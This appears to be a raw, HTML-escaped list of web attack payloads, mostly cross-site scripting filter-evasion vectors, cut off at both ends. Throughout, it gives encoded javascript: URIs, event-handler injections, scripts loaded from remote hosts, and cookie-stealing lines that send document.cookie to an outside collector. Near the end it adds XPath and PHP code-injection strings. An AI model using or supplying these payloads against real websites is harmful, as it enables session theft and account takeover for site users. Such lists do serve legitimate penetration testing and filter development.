SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out&lt;IMG SRC=&quot; &amp;#14; javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;&lt;SCRIPT/SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;&lt;SCRIPT SRC=http://ha.ckers.org/xss.js?&lt; B &gt;&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;\&quot;;alert(&apos;XSS&apos;);//&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);&lt;/SCRIPT&gt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;STYLE&gt;li &#123;list-style-image: url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;&lt;STYLE&gt;BODY&#123;-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)&#125;&lt;/STYLE&gt;&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;exp/*&lt;A STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))&apos;&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;¼script¾alert(¢XSS¢)¼/script¾&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;&lt;IFRAME SRC=# onmouseover=&quot;alert(document.cookie)&quot;&gt;&lt;/IFRAME&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt; &lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;&lt;EMBED SRC=&quot;data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==&quot; type=&quot;image/svg+xml&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCR&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;IPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;&lt;? echo(&apos;&lt;SCR)&apos;;echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt; &lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT =&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT a=&quot;&gt;&apos;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;&lt;A HREF=&quot;htt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;&lt;iframe src=&quot;&amp;Tab;javascript:prompt(1)&amp;Tab;&quot;&gt;&lt;svg&gt;&lt;style&gt;&#123;font-family&amp;colon;&apos;&lt;iframe/onload=confirm(1)&gt;&apos;&lt;input/onmouseover=&quot;javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;&quot;&lt;sVg&gt;&lt;scRipt &gt;alert&amp;lpar;1&amp;rpar; &#123;Opera&#125;&lt;img/src=`` onerror=this.onerror=confirm(1)&lt;form&gt;&lt;isindex formaction=&quot;javascript&amp;colon;confirm(1)&quot;&lt;img src=``&amp;NewLine; onerror=alert(1)&amp;NewLine;&lt;script/&amp;Tab; src=&apos;https://dl.dropbox.com/u/13018058/js.js&apos; /&amp;Tab;&gt;&lt;/script&gt;&lt;ScRipT 5-0*3+9/3=&gt;prompt(1)&lt;/ScRipT giveanswerhere=?&lt;iframe/src=&quot;data:text/html;&amp;Tab;base64&amp;Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;&lt;script /**/&gt;/**/alert(1)/**/&lt;/script /**/&amp;#34;&amp;#62;&lt;h1/onmouseover=&apos;\u0061lert(1)&apos;&gt;&lt;iframe/src=&quot;data:text/html,&lt;svg &amp;#111;&amp;#110;load=alert(1)&gt;&quot;&gt;&lt;meta content=&quot;&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&gt;&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open(&apos;https://www.google.com/&apos;)&gt;&lt;/script&lt;svg&gt;&lt;script x:href=&apos;https://dl.dropbox.com/u/13018058/js.js&apos; &#123;Opera&#125;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&gt;&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;&lt;form&gt;&lt;a href=&quot;javascript:\u0061lert&amp;#x28;1&amp;#x29;&quot;&gt;X&lt;/script&gt;&lt;img/*/src=&quot;worksinchrome&amp;colon;prompt&amp;#x28;1&amp;#x29;&quot;/*/onerror=&apos;eval(src)&apos;&gt;&lt;img/&amp;#09;&amp;#10;&amp;#11; src=`~` onerror=prompt(1)&gt;&lt;form&gt;&lt;iframe &amp;#09;&amp;#10;&amp;#11; src=&quot;javascript&amp;#58;alert(1)&quot;&amp;#11;&amp;#10;&amp;#09;;&gt;&lt;a href=&quot;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&amp;#09;&amp;#10;&amp;#11;&gt;X&lt;/ahttp://www.google&lt;script .com&gt;alert(document.location)&lt;/script&lt;a&amp;#32;href&amp;#61;&amp;#91;&amp;#00;&amp;#93;&quot;&amp;#00; onmouseover=prompt&amp;#40;1&amp;#41;&amp;#47;&amp;#47;&quot;&gt;XYZ&lt;/a&lt;img/src=@&amp;#32;&amp;#13; onerror = prompt(&apos;&amp;#49;&apos;)&lt;style/onload=prompt&amp;#40;&apos;&amp;#88;&amp;#83;&amp;#83;&apos;&amp;#41;&lt;script ^__^&gt;alert(String.fromCharCode(49))&lt;/script ^__^&lt;/style &amp;#32;&gt;&lt;script &amp;#32; :-(&gt;/**/alert(document.location)/**/&lt;/script &amp;#32; :-(&amp;#00;&lt;/form&gt;&lt;input type&amp;#61;&quot;date&quot; onfocus=&quot;alert(1)&quot;&gt;&lt;form&gt;&lt;textarea &amp;#13; onkeyup=&apos;\u0061\u006C\u0065\u0072\u0074&amp;#x28;1&amp;#x29;&apos;&gt;&lt;script /***/&gt;/***/confirm(&apos;\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450&apos;)/***/&lt;/script /***/&lt;iframe srcdoc=&apos;&amp;lt;body onload=prompt&amp;lpar;1&amp;rpar;&amp;gt;&apos;&gt;&lt;a href=&quot;javascript:void(0)&quot; onmouseover=&amp;NewLine;javascript:alert(1)&amp;NewLine;&gt;X&lt;/a&gt;&lt;script ~~~&gt;alert(0%0)&lt;/script ~~~&gt;&lt;style/onload=&amp;lt;!--&amp;#09;&amp;gt;&amp;#10;alert&amp;#10;&amp;lpar;1&amp;rpar;&gt;&lt;///style///&gt;&lt;span %2F onmousemove=&apos;alert&amp;lpar;1&amp;rpar;&apos;&gt;SPAN&lt;img/src=&apos;http://i.imgur.com/P8mL8.jpg&apos; onmouseover=&amp;Tab;prompt(1)&amp;#34;&amp;#62;&lt;svg&gt;&lt;style&gt;&#123;-o-link-source&amp;colon;&apos;&lt;body/onload=confirm(1)&gt;&apos;&amp;#13;&lt;blink/&amp;#13; onmouseover=pr&amp;#x6F;mp&amp;#116;(1)&gt;OnMouseOver &#123;Firefox &amp; Opera&#125;&lt;marquee onstart=&apos;javascript:alert&amp;#x28;1&amp;#x29;&apos;&gt;^__^&lt;div/style=&quot;width:expression(confirm(1))&quot;&gt;X&lt;/div&gt; &#123;IE7&#125;&lt;iframe// src=javaSCRIPT&amp;colon;alert(1)//&lt;form/action=javascript&amp;#x3A;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;&lt;input/type=&apos;submit&apos;&gt;///*iframe/src*/&lt;iframe/src=&quot;&lt;iframe/src=@&quot;/onload=prompt(1) /*iframe/src*/&gt;//|\\ &lt;script //|\\ src=&apos;https://dl.dropbox.com/u/13018058/js.js&apos;&gt; //|\\ &lt;/script //|\\&lt;/font&gt;/&lt;svg&gt;&lt;style&gt;&#123;src&amp;#x3A;&apos;&lt;style/onload=this.onload=confirm(1)&gt;&apos;&lt;/font&gt;/&lt;/style&gt;&lt;a/href=&quot;javascript:&amp;#13; javascript:prompt(1)&quot;&gt;&lt;input type=&quot;X&quot;&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1)&lt;/svg&gt;&apos;&apos;&lt;svg&gt;&lt;script &apos;AQuickBrownFoxJumpsOverTheLazyDog&apos;&gt;alert&amp;#x28;1&amp;#x29; &#123;Opera&#125;&lt;a href=&quot;javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t&amp;lpar;1&amp;rpar;&quot;&gt;&lt;button&gt;&lt;div onmouseover=&apos;alert&amp;lpar;1&amp;rpar;&apos;&gt;DIV&lt;/div&gt;&lt;iframe style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot;&gt;&lt;a href=&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;&gt;X&lt;/a&gt;&lt;embed src=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;object data=&quot;http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf&quot;&gt;&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;&lt;a href=javascript&amp;colon;alert&amp;lpar;document&amp;period;cookie&amp;rpar;&gt;Click Here&lt;/a&gt;&lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror=&apos;prompt(1)&apos;&quot;&gt;&lt;%&lt;!--&apos;%&gt;&lt;script&gt;alert(1);&lt;/script --&gt;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&lt;iframe/src \/\/onload = prompt(1)&lt;iframe/onreadystatechange=alert(1)&lt;svg/onload=alert(1)&lt;input value=&lt;&gt;&lt;iframe/src=javascript:confirm(1)&lt;input type=&quot;text&quot; value=`` &lt;div/onmouseover=&apos;alert(1)&apos;&gt;X&lt;/div&gt;http://www.&lt;script&gt;alert(1)&lt;/script .com&lt;iframe src=j&amp;NewLine;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;v&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;s&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;c&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;i&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;p&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;colon;a&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;l&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;e&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;r&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;t&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;28&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;1&amp;NewLine;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;svg&gt;&lt;script ?&gt;alert(1)&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;&lt;img src=`xx:xx`onerror=alert(1)&gt;&lt;object type=&quot;text/x-scriptlet&quot; data=&quot;http://jsfiddle.net/XLE63/ &quot;&gt;&lt;/object&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;javascript&amp;colon;alert(1)&quot;/&gt;&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1&lt;a href=&quot;data:text/html;base64_,&lt;svg/onload=\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&quot;&gt;X&lt;/a&lt;iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074(&apos;\u0061&apos;) worksinIE&gt;&lt;script&gt;~&apos;\u0061&apos; ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~&apos;\u0061&apos;)&lt;/script U+&lt;script/src=&quot;data&amp;colon;text%2Fj\u0061v\u0061script,\u0061lert(&apos;\u0061&apos;)&quot;&gt;&lt;/script a=\u0061 &amp; /=%2F&lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&lt;object data=javascript&amp;colon;\u0061&amp;#x6C;&amp;#101%72t(1)&gt;&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;&lt;body/onload=&amp;lt;!--&amp;gt;&amp;#10alert(1)&gt;&lt;script itworksinallbrowsers&gt;/*&lt;script* */alert(1)&lt;/script&lt;img src ?itworksonchrome?\/onerror = alert(1)&lt;svg&gt;&lt;script&gt;//&amp;NewLine;confirm(1);&lt;/script &lt;/svg&gt;&lt;svg&gt;&lt;script onlypossibleinopera:-)&gt; alert(1)&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe&lt;script x&gt; alert(1) &lt;/script 1=2&lt;div/onmouseover=&apos;alert(1)&apos;&gt; style=&quot;x:&quot;&gt;&lt;--`&lt;img/src=` onerror=alert(1)&gt; --!&gt;&lt;script/src=&amp;#100&amp;#97&amp;#116&amp;#97:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,&amp;#x0061;&amp;#x06c;&amp;#x0065;&amp;#x00000072;&amp;#x00074;(1)&gt;&lt;/script&gt;&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onmouseover=&quot;prompt(1)&quot; onclick=&quot;alert(1)&quot;&gt;x&lt;/button&gt;&quot;&gt;&lt;img src=x onerror=window.open(&apos;https://www.google.com/&apos;);&gt;&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME&lt;math&gt;&lt;a xlink:href=&quot;//jsfiddle.net/t846h/&quot;&gt;click&lt;object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&gt;&lt;/object&gt;&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;&lt;a href=&quot;data:text/html;blabla,&amp;#60&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#32&amp;#115&amp;#114&amp;#99&amp;#61&amp;#34&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#115&amp;#116&amp;#101&amp;#114&amp;#110&amp;#101&amp;#102&amp;#97&amp;#109&amp;#105&amp;#108&amp;#121&amp;#46&amp;#110&amp;#101&amp;#116&amp;#47&amp;#102&amp;#111&amp;#111&amp;#46&amp;#106&amp;#115&amp;#34&amp;#62&amp;#60&amp;#47&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#62&amp;#8203&quot;&gt;Click Me&lt;/a&gt;&quot;&gt;&lt;script&gt;&quot;&lt;script&gt;alert(&quot;WXSS&quot;)&lt;/script&gt;&lt;&lt;script&gt;alert(&quot;WXSS&quot;);//&lt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&apos;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;\&quot;;alert(&apos;XSS&apos;);//%3cscript%3ealert(&quot;WXSS&quot;);%3c/script%3e%3cscript%3ealert(document.cookie);%3c%2fscript%3e%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E&amp;ltscript&amp;gtalert(document.cookie);&lt;/script&gt;&amp;ltscript&amp;gtalert(document.cookie);&amp;ltscript&amp;gtalert&lt;xss&gt;&lt;script&gt;alert(&apos;WXSS&apos;)&lt;/script&gt;&lt;/vulnerable&gt;&lt;IMG%20SRC=&apos;javascript:alert(document.cookie)&apos;&gt;&lt;IMG%20SRC=&quot;javascript:alert(&apos;WXSS&apos;);&quot;&gt;&lt;IMG%20SRC=&quot;javascript:alert(&apos;WXSS&apos;)&quot;&lt;IMG%20SRC=javascript:alert(&apos;WXSS&apos;)&gt;&lt;IMG%20SRC=JaVaScRiPt:alert(&apos;WXSS&apos;)&gt;&lt;IMG%20SRC=javascript:alert(&amp;quot;WXSS&amp;quot;)&gt;&lt;IMG%20SRC=`javascript:alert(&quot;&apos;WXSS&apos;&quot;)`&gt;&lt;IMG%20&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;WXSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;&lt;IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;&lt;IMG%20SRC=&apos;javasc ript:alert(document.cookie)&apos;&gt;&lt;IMG%20SRC=&quot;jav ascript:alert(&apos;WXSS&apos;);&quot;&gt;&lt;IMG%20SRC=&quot;jav&amp;#x09;ascript:alert(&apos;WXSS&apos;);&quot;&gt;&lt;IMG%20SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;WXSS&apos;);&quot;&gt;&lt;IMG%20SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;WXSS&apos;);&quot;&gt;&lt;IMG%20SRC=&quot;%20&amp;#14;%20javascript:alert(&apos;WXSS&apos;);&quot;&gt;&lt;IMG%20DYNSRC=&quot;javascript:alert(&apos;WXSS&apos;)&quot;&gt;&lt;IMG%20LOWSRC=&quot;javascript:alert(&apos;WXSS&apos;)&quot;&gt;&lt;IMG%20SRC=&apos;%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)&apos;&gt;&lt;IMG%20SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;IMG%20SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;IMG%20SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&apos;%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E&quot;&gt;&lt;script&gt;document.location=&apos;http://cookieStealer/cgi-bin/cookie.cgi?&apos;+document.cookie&lt;/script&gt;%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//&gt;&lt;/SCRIPT&gt;!--&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;&#123;&#125;&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125; XML123456789101112131415count(/child::node())x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y&lt;name&gt;&apos;,&apos;&apos;)); phpinfo(); exit;/*&lt;/name&gt;&lt;![CDATA[&lt;script&gt;var 